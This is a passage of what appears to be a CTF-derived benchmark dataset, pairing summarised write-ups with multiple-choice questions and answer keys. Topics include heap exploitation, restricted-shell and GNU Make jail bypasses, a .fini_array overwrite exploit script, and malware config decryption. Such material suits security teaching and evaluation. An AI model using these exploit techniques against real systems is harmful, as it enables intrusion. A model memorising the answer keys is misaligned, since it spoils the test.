            "In a security challenge, a script generates a 16-character string from uppercase alphabet letters. To guess each letter, participants input a number that is left-shifted 16 bits and then modulo-ed with the ASCII value of the letter to be guessed. To find a constant input yielding unique remainders for all possible letters, which strategy is most effective?  - A. Using a single random fixed input for all guesses without calculating unique remainders. - B. Iterating over a range of numbers to find a constant `g` such that `(g << 16) % ord(character)` produces non-unique remainders for all characters, then choosing any `g`. - C. Iterating over a range of integers to find a constant `g` such that `(g << 16) % ord(character)` results in unique remainders for each character in the uppercase alphabet. - D. Choosing a constant `g` arbitrarily without testing for unique remainders for all characters. ",
            "In a challenge where a script involves guessing letters of a secret string via modulo operations and participants are allowed three guesses per letter, how can they use these guesses to enhance the accuracy of identifying each letter based on remainders?  - A. By guessing the same number three times for each letter, ensuring consistency of the remainders received. - B. Utilizing the three guesses to submit the same high number, which is expected to return a wider range of remainders. - C. Leveraging all three guesses to obtain a single remainder per guess, thereby using each guess to test for character collisions. - D. Employing the three guesses to obtain different remainders for each character, which allows for mapping these remainders back to the characters with higher accuracy, avoiding potential collisions. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Machbook",
        "write_up": "dataset/raw/Machbook.md",
        "type": "pwn",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting heap-based vulnerabilities in OSX's Small Heap mechanism, it's crucial to understand the heap structure, specifically for forging a fake heap structure for an unlink attack. Unlike glibc's unsafe unlink, OSX requires the previous pointer at `ptr` and the next pointer at `ptr+0x10`. Additionally, calculating a valid checksum is mandatory as an invalid one will terminate the program. The checksum formula is `SumOfEveryBytes(ptr ^ small-rack-cookie ^ small-rack-ptr)`, necessitating knowledge of internal heap metadata (small-rack-cookie and small-rack-ptr) for successful exploitation.",
            "Arbitrary write in OSX heap exploitation scenarios, such as the mentioned challenge, can be achieved by leveraging the unsafe unlink technique with checksum protection. This involves forging a fake heap structure to overwrite pointers of interest (e.g., user struct pointers) to control program execution flow or manipulate function pointers for remote code execution (RCE). An important strategy to ensure the reliability of heap exploits, especially in multi-core systems where allocations might not occur in the expected heap region (Magazine), is to iteratively allocate memory until it appears in the desired region. This can be facilitated by arbitrary read capabilities to check the location of allocated heap chunks."
        ],
        "question": [
            "In an OSX system, when performing a heap exploitation that requires a valid checksum for unlink operation, which of the following is the correct formula to calculate the checksum for a forged heap structure? - A. `SumOfEveryBytes(ptr + small-rack-cookie + small-rack-ptr)` - B. `SumOfEveryBytes(ptr xor small-rack-cookie xor small-rack-ptr)` - C. `SumOfEveryBytes(ptr & small-rack-cookie & small-rack-ptr)` - D. `SumOfEveryBytes(ptr | small-rack-cookie | small-rack-ptr)` ",
            "In scenarios where OSX heap exploitation involves arbitrary write via unsafe unlink technique with checksum protection, what is a crucial step to ensure reliability of the exploit, especially on multi-core systems? - A. Iteratively encrypting the payload until it bypasses security mechanisms. - B. Randomizing the heap layout to find a suitable memory location. - C. Iteratively allocating memory until the allocated chunk appears in the desired heap region (Magazine). - D. Using a single-core system to avoid complications with memory allocations. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Machine Trouble",
        "write_up": "dataset/raw/Machine Trouble.md",
        "type": "misc",
        "competition": [
            "Pearl/2024",
            "https://ctftime.org/event/2231/tasks/"
        ],
        "score": 472,
        "max_score": 500,
        "difficulty": 0.944,
        "knowledge": [
            "When dealing with programming challenges involving Finite State Machines (FSMs) in CTFs, especially ones that allow for creation or modification of states and transitions, understanding the mechanics of DFA (Deterministic Finite Automata) and the strategy of excluding certain characters ('~l') or including all characters ('@') to transition between states is crucial. This approach can be employed to discern hidden or restricted characters in a given string, flag, or input by systematically excluding known undesirable characters or including potential candidates.\n   \n    Sample payload construction method:\n    ```python\n    # Construct transitions that exclude a specific character 'l'\n    t = [\"\".join([str(i), ' ~l ', str(i+1)]) for i in range(length-1)]\n    ```",
            "Automating the testing process for string extraction in CTF challenges by crafting payloads dynamically based on feedback from the challenge (e.g., indication of a correct state transition or trapping state) can significantly enhance the efficiency of finding the correct string or flag. This applies especially to scenarios where the flag or critical string is verified character by character, or a series of condition checks are performed sequentially. The strategy involves iteratively adjusting the payload based on the outcome of each attempt, progressively narrowing down to the valid characters or sequence.\n\n    Example approach to automate character testing:\n    ```python\n    whitelist = \"_acdefhk\"  # Based on derived or guessed valid characters\n    for pos in range(string_length):  \n        for char in whitelist:  \n            payload = crafted_payload_function(char, pos)  # Function to craft payload based on position and char\n            response = send_payload_to_challenge(payload)  # Function to interact with the challenge\n            if response_indicates_success(response):  \n                result += char  \n                break\n    ```\nThese methods underline the importance of understanding CTF challenge mechanics, incorporating programming techniques for automation, and iteratively refining approaches based on dynamic feedback."
        ],
        "question": [
            "In a Finite State Machine (FSM) challenge to find a hidden string, you are given the capability to define states and transitions, which are constrained by certain characters being prohibited ('~l') or all characters being allowed ('@') for state transitions. How would you construct a transition that specifically excludes the character 'l' from causing a state transition? - A. `t = [\"\".join([str(i), ' exclude l ', str(i+1)]) for i in range(length-1)]` - B. `t = [\"\".join([str(i), ' @ ', str(i+1)]) for i in range(length-1)]` - C. `t = [\"\".join([str(i), ' ~l ', str(i+1)]) for i in range(length-1)]` - D. `t = [\"exclude l from \" + str(i) + \" to \" + str(i+1) for i in range(length-1)]`",
            "While solving a cybersecurity challenge where the goal is to automatically extract a flag character-by-character, a method is used where each character is tested individually within a specified position by dynamically crafting payloads based on feedback. This method involves a whitelist of assumed valid characters. Given this approach, how would you automate the testing of each character from the whitelist '_acdefhk' for each position in the flag string? - A. `whitelist = \"_acdefhk\"; for i in range(11): print(i)` - B. `whitelist = \"_acdefhk\"; for char in whitelist: send_payload(char)` - C. `whitelist = \"_acdefhk\"; for pos in range(11): for i in whitelist: if test_character(i, pos): break` - D. `whitelist = \"_acdefhk\"; for pos in range(11): for i in whitelist: data = bytes(crafted(i, pos), 'ascii'); if send_and_receive(data): result += i; break`"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Made Functional",
        "write_up": "dataset/raw/Made Functional.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When facing a restricted shell environment where direct execution of common binaries is not possible due to path restrictions, look for built-in shell commands that can be repurposed to achieve the intended outcome. Specifically, in a bash environment with `$PATH` unset or restricted, bypassing execution limitations to read file contents can be achieved through creative use of bash built-ins like `source`. This approach relies on the side-effect of errors thrown by the `source` command when attempting to execute the contents of a file not meant to be run as a script, effectively leaking its contents.  \n   Example Payload: `source flag.txt`",
            "In scenarios where direct file content disclosure methods (like `cat`) are blocked by restrictions, and indirect methods must be employed, circumventing these restrictions often requires a deep understanding of the environment's capabilities and limitations. In this case, knowledge of bash's behaviors and built-in commands becomes crucial. Leveraging error messages or unintended command outputs is a viable strategy to extract sensitive information or file contents. This technique can be universally applied in similar restricted environments, where direct methods are not feasible but indirect command execution can lead to successful information disclosure.  \n   Application Condition: Applicable in environments where error outputs or the behavior of built-ins can be observed or controlled."
        ],
        "question": [
            "When operating within a bash shell where the `$PATH` variable has been cleared, preventing access to standard command-line utilities, which built-in bash command can effectively be used to read the contents of a file, leveraging error output for information disclosure? - A. `exec flag.txt` - B. `source flag.txt` - C. `bash flag.txt` - D. `eval flag.txt`",
            "In a restricted command execution environment where traditional methods of file content disclosure are blocked, which of the following techniques is NOT a viable strategy for extracting sensitive information or file contents through indirect command execution? - A. Utilizing the side-effects of errors thrown by built-in commands. - B. Leveraging built-in commands to execute files as scripts, hoping to catch error messages that reveal file contents. - C. Directly using `cat` to display file contents despite the restrictions. - D. Observing and controlling the output of commands to extract unintended information or errors."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Made Harder",
        "write_up": "dataset/raw/Made Harder.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with restrictions in a command execution environment (like a shell or a specific language interpreter), which only allow for the use of special characters, leveraging the features of the available language can bypass the restriction. In the context of a GNU Make jail restricting input to special characters, GNU Make's Automatic Variables (`$@` for the target name and `$<` for the first prerequisite) can substitute direct command input. This approach allows for command execution (e.g., reading files) without needing alphanumeric characters.\n   - Example payload in GNU Make format: \n   ```\n   cat: flag.txt\n   \\t$@ $<\n   ```",
            "Understanding the built-in features of languages or tools (like GNU Make's Automatic Variables) is vital for crafting solutions that work within imposed limitations. Specialized knowledge of how these features work can turn seemingly restrictive conditions into an advantage, especially in scenarios where direct interaction with a system or direct command execution is limited or filtered."
        ],
        "question": [
            "In a GNU Make jail challenge, restricted to only using special characters, how can you execute the command to read the content of `flag.txt` by exploiting GNU Make's automatic variables?  -   A. Using `cat` as the target and `$@ $^` in the recipe to automatically build the command. -   B. Using `cat` as the target and `$@ $<` in the recipe to automatically build the command. -   C. Using `read` as the target and `$% $$` in the recipe to build the command. -   D. Using `echo` as the target and `$$ $&` in the recipe to try and output the contents of `flag.txt`. ",
            "When faced with an environment that filters or restricts direct command execution, understanding the capabilities of the environment can be crucial. Given the GNU Make environment with stringent character restrictions, which GNU Make feature can effectively bypass such restrictions for command execution?  -   A. Make's file inclusion directive to include a crafted Makefile with the command. -   B. Make's pattern substitution feature to replace characters in variables. -   C. GNU Make's Automatic Variables to substitute for direct command input. -   D. GNU Make's silent mode to suppress command output for stealth execution. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Made Sense",
        "write_up": "dataset/raw/Made Sense.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with server-side filtering or restrictions on input characters in command execution environments (such as when restricted keywords like \"flag\" are filtered), look for alternative ways to execute commands without using the prohibited words directly. In the context of a restricted shell or sandbox environment where direct references to target files or commands are blocked, using wildcards (e.g., `*`) can be an effective method to bypass these restrictions. An example of bypassing a filter to read files without using the word \"flag\" directly: `cat *.txt`.",
            "Regular expressions (regex) are commonly used to validate user input in web applications. Understanding the pattern being used for validation can reveal potential avenues for bypassing the security measures. When a regex pattern (e.g., `re.fullmatch(r'[A-Za-z0-9]+', target_name)`) restricts input to alphanumeric characters for a specific field and blocks newline characters and certain keywords in another field, injecting commands that conform to these patterns can bypass the input validation. In scenarios where multiline input or certain keywords are restricted, focusing on crafting payloads that remain within a single line and avoid directly using filtered terms can be critical. For scenarios requiring the execution of commands, an effective bypass might not involve directly inserting characters or strings that are explicitly filtered (like breaking out of restricted patterns without using newline characters or restricted keywords)."
        ],
        "question": [
            "In a scenario involving a web application with server-side input filtering to prevent the execution of unauthorized commands, which technique can be effectively used to bypass restrictions that prevent direct references to a specific file, such as \"flag.txt\"? - A. Using exact filenames and paths to access the file. - B. Employing wildcards such as `*` to generalize file access without specifying the filename directly. - C. Allocating additional variables to reference the prohibited words directly. - D. Implementing complex encoding methods to obfuscate the command. ",
            "Given a web application that employs regular expressions to validate user inputs, blocking inputs containing newline characters, and restricting inputs to alphanumeric characters for a specific field, what approach can bypass such input validations when the goal is to execute a command that reads files within a directory without directly mentioning disallowed words? - A. Injecting a multi-line command that directly includes the name of the targeted file. - B. Crafting a payload that adheres to the single-line alphanumeric restriction for the targeted field and avoids using the filtered terms directly. - C. Utilizing a straightforward SQL injection to bypass regular expression checks. - D. Encrypting the entire command to avoid detection by the regular expression filter. "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Made With Love",
        "write_up": "dataset/raw/Made With Love.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving a restricted shell environment where common binaries are inaccessible due to an empty `$PATH`, one can utilize the GNU Make's implicit rules and variables to execute commands. This approach leverages `make` capabilities to bypass the lack of direct access to shell utilities like `cat`. Example approach in GNU Make: define a target with a recipe that uses automatic variables such as `$@` (the target name) and `$<` (the name of the first prerequisite) to craft a command that can echo or manipulate files, acting as a workaround. This method capitalizes on the fact that GNU Make does not require direct shell access to binaries for certain operations, thus circumventing the restrictions imposed by the empty `$PATH`.",
            "When facing challenges with stringent input validation that only allows a specific set of special characters, it's possible to leverage the syntax and features of the used scripting or programming language to bypass these limitations. In the context of a GNU Make environment, making use of special characters allowed in the recipe's content or target definitions can achieve code execution or command injection, even when standard alphanumeric characters or common command utilities are restricted. This strategy benefits from the flexibility and power of GNU Make's syntax and built-in functions, enabling creative solutions to restricted input scenarios."
        ],
        "question": [
            "In the context of a CTF challenge where a bash environment's `$PATH` variable is intentionally left empty to restrict the use of common binaries, which GNU Make feature can be exploited to execute commands without needing direct access to these binaries? - A. Using `make`'s automatic variables such as `$@` and `$<` to construct commands. - B. Modifying the `$PATH` within the Makefile to include directories with common binaries. - C. Directly calling shell binaries from within the Makefile without using `$PATH`. - D. Writing a custom Makefile rule that automatically reinstates the `$PATH`.",
            "Given a restricted environment where only special characters: `!@#$%^&*()[]{}<> ` are permitted in input for a GNU Make challenge, which approach effectively leverages GNU Make's capabilities to circumvent these input restrictions? - A. Utilizing GNU Make's special characters in recipes for command execution. - B. Encoding alphanumeric characters using only the allowed special characters. - C. Avoiding the use of GNU Make and instead executing shell scripts directly. - D. Using a different tool that does not require special characters for operation."
        ],
        "answer": [
            "A.",
            "A."
        ]
    },
    {
        "name": "Maelstrom",
        "write_up": "dataset/raw/Maelstrom.md",
        "type": "crypto",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 474,
        "max_score": 500,
        "difficulty": 0.948,
        "knowledge": [
            "When facing slow performance issues in computational problems, especially those involving primality testing like checking if a number is a Mersenne prime (\\(2^n - 1\\)), leveraging existing lists of primes or mathematical constructs can vastly improve execution time. Pre-computed values such as Mersenne exponents can be particularly useful for cryptography tasks involving prime numbers. This approach is faster than calculating each prime from scratch, especially for large numbers.",
            "Optimization of cryptographic algorithms can often be achieved by applying mathematical insights or pre-existing resources such as the OEIS (Online Encyclopedia of Integer Sequences). For instance, utilizing lists of known Mersenne primes or their exponents to directly compute values needed for decrypting or encoding messages instead of iteratively finding these primes can expedite the process significantly. This is especially relevant in scenarios involving xor operations with primes for encoding or decoding messages.\n\nExample Payload for Implementing the Optimization:\n```python\nme = [2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127, 521, 607, 1279, 2203, 2281, 3217, 4253, 4423, 9689, 9941, 11213, 19937, 21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269, 2976221, 3021377, 6972593, 13466917, 20996011, 24036583, 25964951, 30402457, 32582657, 37156667, 42643801, 43112609]\ncipher = [Cipher Text Array]  # Placeholder for actual cipher text split into an array\nflag = \"\"\nfor count in range(len(cipher)):\n    flag += chr(int(cipher[count]) ^ (2**me[count]-1))\nprint(f\"flag{{{flag}}}\")\n```\nThis sample illustrates how pre-computed Mersenne exponents can be used to decrypt a message encoded via xor with Mersenne primes, significantly reducing computation time."
        ],
        "question": [
            "When decrypting a message that involves xor operations with prime numbers, which approach significantly improves performance by avoiding the need for iterative prime checking? - A. Using the Sieve of Eratosthenes to generate prime numbers for each xor operation. - B. Leveraging a pre-computed list of Mersenne exponents for direct computation. - C. Implementing the RSA algorithm to decrypt each character of the message. - D. Calculating Fibonacci numbers to use in the xor operation for prime generation.",
            "In optimizing cryptographic algorithms that involve xor operations with primes, how can one expedite the decrypting process? - A. By computing the factorial of each prime number before performing xor operations. - B. Utilizing the Pythagorean theorem to find relationships between prime numbers. - C. Applying mathematical insights such as using lists of known Mersenne primes or their exponents directly. - D. Increasing the computational power of the hardware running the decryption code."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Mafia",
        "write_up": "dataset/raw/Mafia.md",
        "type": "This write-up is for a challenge that involves asking a specific series of questions to determine the friend with the most money to bribe the Mafia. Based on the given information, the type of this challenge is **misc**.",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge requiring the identification of a maximum or minimum value from a set of elements obscured by limited interaction (like a limited number of questions), using the binary search algorithm optimizes the search process. Conditions for this knowledge to be applicable include having a way to compare elements against an arbitrary value to determine if they are larger, smaller, or equal, and being limited by the number of interactions (e.g., questions) you can make. This method dramatically reduces the number of required interactions by dividing the search space in half with each interaction, making it efficient for large sets of elements.",
            "In scenarios where the precise value of a sought element is determined through comparative queries (greater than, less than, or equal to), it is advantageous to adjust the search range based on responses to rapidly converge on the target value. This process involves dynamically updating the minimum and maximum bounds of the possible values based on the feedback obtained from each query, effectively narrowing down the search space until the exact value is identified."
        ],
        "question": [
            "When performing a search to find the maximum value a friend has, given a scenario where each friend can only tell if they have more, less, or equal money compared to a given value and you can only ask a limited number of questions, which algorithm is most efficient to optimize the search process? - A. Linear search, checking each value sequentially until the maximum is found. - B. Binary search, halving the search space with each question based on the responses received. - C. Bubble sort, to sort all the values first and then picking the last value as the maximum. - D. Random search, randomly picking friends and values to guess the maximum amount.",
            "In a game where you're determining the exact amount of money a friend has by asking if their amount is greater, less, or equal to your guesses, if your friend responds that their amount is greater than your guess, which of the following actions should be taken to rapidly converge on the exact amount? - A. Decrease your next guess to eliminate higher values outside the probable range. - B. Repeat the same guess to verify the friend's response. - C. Adjust your next guess to be lower than the current one, assuming a mistake in the friend's response. - D. Increase the minimum bound of your guesses to the current value plus one, effectively narrowing the search range upwards."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Magic in the Hex",
        "write_up": "dataset/raw/Magic in the Hex.md",
        "type": "forensics",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 100,
        "max_score": 550,
        "difficulty": 0.18181818181818182,
        "knowledge": [
            "When encountering files with unknown or non-standard extensions in digital forensics, examining the file's magic bytes can help determine its format. Magic bytes are the initial bytes of a file that signify its type. This technique allows for the identification of file formats even when extensions are missing or misleading.",
            "Online resources, such as the Wikipedia List of File Signatures, can be used effectively to find the magic bytes of various file formats. Knowledge of magic bytes for specific file types, such as VMDK files in this instance, is useful for forensic analysis and CTF challenges involving file format identification."
        ],
        "question": [
            "When conducting digital forensics analysis and encountering a file with an unknown or odd extension, which approach is most effective for determining the file's format? - A. Check the file\u2019s size and compare it with common file sizes. - B. Open the file with a text editor and look for readable text. - C. Examine the file\u2019s \"magic bytes\" to identify its format. - D. Rename the file with different extensions and try to open it with various applications.",
            "In the context of digital forensics, where can one find a reliable source of information for magic bytes of various file formats, including VMDK files? - A. Consulting the device manufacturer's documentation. - B. Using online forums and community discussions. - C. Through the Wikipedia List of File Signatures. - D. By inspecting the file in a hex editor without any reference."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Magic OTP",
        "write_up": "dataset/raw/Magic OTP.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When encountering a vulnerability related to the incorrect handling of array sizes in C, especially when dealing with cryptographic functions like key generation or encryption, it's important to thoroughly analyze the use of `sizeof` on function parameters that are arrays. In C, `sizeof` on an array parameter returns the size of a pointer on the platform, not the array's intended size. This could lead to vulnerabilities such as copying insufficient bytes of a key or data buffer, potentially allowing brute-force attacks on what should otherwise be secure operations. This knowledge is critical when reviewing or debugging security-sensitive code in C where encryption or key generation is involved, ensuring that all bytes of keys or sensitive data intended to be copied or processed actually are.",
            "For challenges involving encrypted data where part of the encryption key or the entire key is not correctly applied (e.g., due to the aforementioned bug in handling `sizeof` with array function parameters), a brute-force attack strategy can be effective. This approach involves generating potential keys (within a feasible search space), decrypting the ciphertext, and setting a stop condition based on known plaintext characteristics to identify the correct key. In cases where only a portion of the key is incorrect or unknown (as when an incorrect `sizeof` leads to only part of a buffer being correctly filled), reducing the brute-force search space to the incorrectly handled portion can make the attack feasible within a reasonable amount of time. This method requires a careful analysis of both the encryption mechanism (e.g., AES in ECB mode) and the nature of the plaintext data (e.g., an OTP padded with zeros) to set an effective stop condition.\n\nSample strategy for the stop condition: If the known structure of the plaintext includes padding with zeros, as in the case of an OTP or similar data, the decryption output can be checked for this pattern. This specific knowledge can dramatically reduce the time needed to discover the correct key, leveraging known plaintext characteristics to validate potential keys without requiring access to or interaction with the target server for each attempt."
        ],
        "question": [
            "During a security review of C code, you encounter a function intended for cryptographic key handling that receives an array as a parameter. What vital aspect must be considered to avoid vulnerabilities associated with the array size handling? - A. Ensure that `sizeof(array)` within the function accurately reflects the array's intended size, not the size of the pointer. - B. Convert the array to a string before using `sizeof` to ensure correct size calculation. - C. Use a fixed integer for size checks instead of `sizeof` to avoid dynamic size evaluation errors. - D. Instead of `sizeof`, manually count the elements in the array during runtime for each operation requiring the size. ",
            "In a scenario involving brute-force decryption of encrypted data, whereby a bug resulted in only a part of the encryption key being correctly applied, which strategy is most effective for determining the correct key, assuming the plaintext is known to contain specific characteristics (e.g., it is padded with zeros)? - A. Decrypt with a random key generation approach until the server confirms the success of decryption. - B. Systematically generate potential keys within the identified feasible search space, decrypt the ciphertext, and use a stop condition based on the known characteristics of the plaintext (e.g., presence of padding zeros) for identifying the correct key. - C. Encrypt a sample plaintext with all possible keys and compare each result to the ciphertext without considering plaintext characteristics. - D. Use a machine learning model to predict the key based on the frequency of zeros in the ciphertext. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Magic Space Bussin",
        "write_up": "dataset/raw/Magic Space Bussin.md",
        "type": "pwn",
        "competition": [
            "HackASat/2023/Quals",
            "https://ctftime.org/event/1837/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges where memory allocation and deallocation are involved, it's crucial to inspect the source code for inconsistent allocation and deallocation behavior that might lead to vulnerabilities such as buffer overflow or memory leaks. For example, a discrepancy between the allocation size and the expected payload size during parsing can be exploited for buffer over-reads or overflows, leveraging the program's logic to manipulate the memory layout and achieve arbitrary code execution or information leakage.",
            "When dealing with heap exploitation, understanding the management of memory (malloc and free operations) and the structure of heap memory in the context of glibc can be vital. Techniques like creating a fake chunk within the heap, manipulating the tcache (thread cache) bins, and leveraging the properties of the chunk headers (such as the previous in use (P) bit) to perform unlinking or merging operations can enable an attacker to corrupt memory or perform unauthorized memory access. Specifically, by carefully crafting heap operations, one can manipulate the heap to leak addresses (heap or libc), overwrite memory, and ultimately hijack the program's execution flow."
        ],
        "question": [
            "In a scenario where a program calculates the size for a buffer allocation and the length of the payload differently when handling hexadecimal inputs, leading to potential buffer overflow or memory leaks, which of the following is a crucial aspect to analyze for exploiting the vulnerability?  - A. The relationship between the hexadecimal input length and the buffer allocation size. - B. The color of the hexadecimal characters used in the input. - C. Conversion of hexadecimal input to binary format before processing. - D. The number of hexadecimal characters allowed by the input field. ",
            "When exploiting heap-based vulnerabilities by creating a fake chunk in memory, which of the following is not a valid consideration in the context of manipulating tcache (thread cache) bins and leveraging chunk header properties?  - A. Manipulating the forward and backward pointers of a chunk to integrate it into a bin's linked list. - B. Changing the font size of the data stored within the chunk to bypass security checks. - C. Crafting the previous in use (P) bit and the size in the chunk header to influence malloc and free behavior. - D. Creating a fake chunk with valid pointers, a valid header, and a corresponding previous size field to trigger a merge with another chunk. "
        ],
        "answer": [
            "A. The relationship between the hexadecimal input length and the buffer allocation size.",
            "B. Changing the font size of the data stored within the chunk to bypass security checks."
        ]
    },
    {
        "name": "Magic trick",
        "write_up": "dataset/raw/Magic trick.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When dealing with binaries that have no RELRO (Relocation Read-Only) protection, it is possible to overwrite the Global Offset Table (GOT) or the `.fini_array` to divert the control flow of the application. This technique can be utilized when direct buffer overflow vulnerabilities are not present but the application still allows for arbitrary write vulnerabilities. Condition: The binary must have no RELRO protection and should allow for writing to arbitrary addresses.",
            "In scenarios where PIE (Position Independent Executable) is not enabled for a binary, the addresses within the binary do not change between executions. This characteristic allows an attacker to reference specific functions or memory locations directly by their addresses as known from analysis tools such as Ghidra. This can be crucial for crafting payloads in Pwn challenges, especially when combined with writing to control flow affecting sections like `.fini_array`. Condition: The binary must have PIE disabled, allowing for static addresses to be reliably targeted in payloads.\n\nExample Payload:\n```python\nfrom pwn import *\n\nhost = remote('example.com', 1234)\n\nwin_addr = p64(0x00400667)  # Address of win function\nfini_addr = p64(0x00600a00)  # Address of .fini_array section\n\nhost.recv()  \nhost.sendline(win_addr)  \nhost.recv()  \nhost.sendline(fini_addr)\n\nhost.interactive()  \n```"
        ],
        "question": [
            "When a binary compiled for an amd64 architecture has no RELRO protection and an attacker finds an arbitrary write vulnerability, what critical segment(s) can be targeted to alter the flow of execution successfully? - A. `.text` section - B. Heap memory - C. `.fini_array` or Global Offset Table (GOT) - D. Stack memory",
            "In a Pwn challenge where Position Independent Executable (PIE) protection is disabled for an amd64 binary, why might an attacker benefit from this setting when crafting an exploit? - A. It enables ASLR (Address Space Layout Randomization) at runtime. - B. It allows for dynamic linking of libraries. - C. It permits the hardcoding of function addresses in the exploit payload. - D. It facilitates the use of stack canaries for protecting buffer overflows."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Magically Delicious",
        "write_up": "dataset/raw/Magically Delicious.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": 100,
        "max_score": 700,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "In challenges involving encoding and emojis, conversion between numerical systems (like ASCII to octal) and representing digits as emojis is a creative encryption technique. This can be deciphered by reversing the process, mapping each emoji back to its original numerical representation, and then converting from octal digits to the ASCII character set. A practical approach involves:\n   - Mapping each unique emoji to a digit.\n   - Converting sequences of these emoji-digits into octal numbers.\n   - Translating octal numbers back to ASCII characters to reveal the message.  \n\n   This methodology requires understanding of both numeral systems conversion and the emoji mapping strategy utilized for encryption.",
            "Perlmutating unknown emoji-to-digit mappings efficiently decodes messages when partial encryption mappings are unknown but the overall encoding strategy is identified. This involves:\n   - Identifying known mappings (emoji to digit) and the structure of the encryption (e.g., octal numbers to ASCII).\n   - Generating permutations for the unknown parts of the mapping.\n   - Iteratively testing these permutations against the encoded message to find the correct decoding.  \n\n   This approach is effective in scenarios where the encryption process is understood but not all specifics of the encoding mapping are clear. It leverages `itertools.permutations` in Python to systematically test all possible mappings."
        ],
        "question": [
            "In the context of decoding messages hidden in emojis, given that a cipher text is represented through a combination of specific emojis mapped to octal digits, which then corresponds to ASCII characters, what process correctly describes the method to decrypt such a message? - A. Converting emoji sequences directly to binary numbers, then translating those to ASCII. - B. Mapping each emoji to a hexadecimal digit, combining these into hexadecimal codes, and converting those to text. - C. Assigning each emoji an arbitrary value, combining these values at random, and attempting to derive meaning without conversion. - D. Mapping unique emojis to specific digits, converting sequences of these emojis to octal numbers, and translating those octal numbers back to ASCII characters to decode the message.",
            "When faced with a message encrypted by mapping emojis to digits following a pattern where some mappings are unknown, and it is established that these mappings are to octal digits that then convert to ASCII characters, what technique is beneficial in attempting to decode the message? - A. Utilize a direct translation from the emojis to ASCII without any intermediate digit conversion, guessing the meaning through context. - B. Guessing the emoji-digital mapping based on frequency analysis of the emojis used, without applying systematic permutation techniques. - C. Generating permutations for the unidentified parts of the emoji-to-digit mapping and iteratively testing these against the encoded message to find the correct decryption. - D. Applying a one-time pad encryption approach to guess the emoji mappings without utilizing permutations or known mapping strategies."
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "Malware - Phase 2",
        "write_up": "dataset/raw/Malware - Phase 2.md",
        "type": "crypto",
        "competition": [
            "DamCTF/2020",
            "https://ctftime.org/event/1076/tasks/"
        ],
        "score": 400,
        "max_score": 498,
        "difficulty": 0.8032128514056225,
        "knowledge": [
            "When dealing with encrypted malware configurations, especially in cases where ARC4 encryption is utilized, it is imperative to identify the encryption key and the specific algorithm's implementation details in the malware code. The process includes locating the pointers to the key and encrypted data segments in the disassembled code, understanding the encryption algorithm's parameters (key length, data length, and any custom modifications to the standard decryption process), and then crafting a script to automate decryption. This approach is applicable in scenarios involving static analysis of binaries to extract encrypted configurations.\n\nExample script snippet: \n```python\nfrom Crypto.Cipher import ARC4\ndef rc4_decrypt(key,ct):\n    cipher = ARC4.new(key)  \n    # Custom decryption process follows...\n```",
            "In scenarios where malware configurations are obfuscated or encrypted within binary files, leveraging disassembler tools (such as IDA Pro, Ghidra) to analyze the binary and extracting segments corresponding to .rodata and .data can be crucial. This allows for the extraction of encryption keys and encrypted data. Following this, programming languages like Python can be utilized to write scripts that automate the decryption based on the algorithm identified during the analysis. This knowledge is useful in reverse engineering tasks targeting the retrieval of hidden or encrypted information within malware binaries."
        ],
        "question": [
            "In a cybersecurity scenario where an analyst is tasked with decrypting malware configuration using ARC4 encryption, given that the key is extracted from a binary's .rodata section and the encrypted configuration entries are in the .data section, which Python library is used to initialize the ARC4 decryption process as demonstrated in a provided script? - A. PyCryptoDome - B. cryptography.hazmat - C. PyCrypt - D. Crypto.Cipher",
            "In the context of reverse engineering encrypted malware configurations, when a security researcher needs to extract both the encryption key and encrypted data from a binary file, which section should the encryption key be located in for the decryption process that follows? - A. .text - B. .data - C. .bss - D. .rodata"
        ],
